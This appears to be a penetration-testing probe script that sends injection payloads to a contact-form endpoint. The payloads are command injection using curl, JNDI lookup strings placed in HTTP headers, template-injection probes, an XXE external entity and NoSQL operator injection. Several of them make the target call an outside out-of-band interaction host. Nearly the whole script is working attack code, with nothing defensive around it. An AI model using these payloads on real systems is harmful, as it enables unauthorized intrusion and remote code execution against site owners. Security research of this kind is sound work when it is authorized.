import sys, time, json, subprocess
sys.path.insert(0,".")
from ic import post, build, HOST, UA

SSRF = "oob3bc2cb690cba.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
XXE  = "oob405d6f4396bd.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def raw(label, body, ctype="application/x-www-form-urlencoded", extra=None, tries=10, gap=4):
    code, hdr, bd, n = post(None, raw=body, ctype=ctype, extra=extra, tries=tries)
    interesting = [h for h in hdr.splitlines()
                   if re.search(r'x-vercel-error|x-matched-path|x-error|stack|trace', h, re.I)]
    print("%-40s HTTP %-4s %s" % (label, code, bd[:200].replace("\n"," ")))
    for h in interesting[:4]:
        print("      ", h.strip()[:160])
    time.sleep(gap)
    return code, hdr, bd

import re
base = "fname=Test&lname=User&areacode=973&tel=1234567&cname=QA&subject=S&check=on"

print("=== 500 error path: is the error verbose? ===")
raw("missing msg (500?)", base)
raw("msg only", "msg=hello")
raw("empty body", "")

print()
print("=== JNDI / CMDi / SSTI (paced) ===")
raw("cmd-injection msg", base+"&msg=x%3Bcurl+http%3A%2F%2F"+SSRF.replace(".","%2E")+"%2Fcmdi%3B")
raw("SSTI {{7*7}}", base+"&msg=%7B%7B7*7%7D%7D")
raw("JNDI in User-Agent", base+"&msg=m", extra=["-H","User-Agent: ${jndi:ldap://"+SSRF+"/j}"])
raw("JNDI in X-Forwarded-For", base+"&msg=m", extra=["-H","X-Forwarded-For: ${jndi:ldap://"+SSRF+"/j2}"])
raw("SSTI in cname", base+"&msg=m&cname=%7B%7B7*7%7D%7D")

print()
print("=== XXE (XML body) ===")
xml = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://'+XXE+'/xxe">]>'
       '<r><fname>&x;</fname><msg>m</msg><targets>1</targets></r>')
raw("xml XXE", xml, ctype="application/xml")
raw("text/xml XXE", xml, ctype="text/xml")

print()
print("=== NoSQL / JSON ===")
raw("json $ne", json.dumps({"fname":"T","msg":"m","targets":{"$ne":None}}), ctype="application/json")
raw("json $regex", json.dumps({"fname":"T","msg":"m","targets":{"$regex":".*"}}), ctype="application/json")
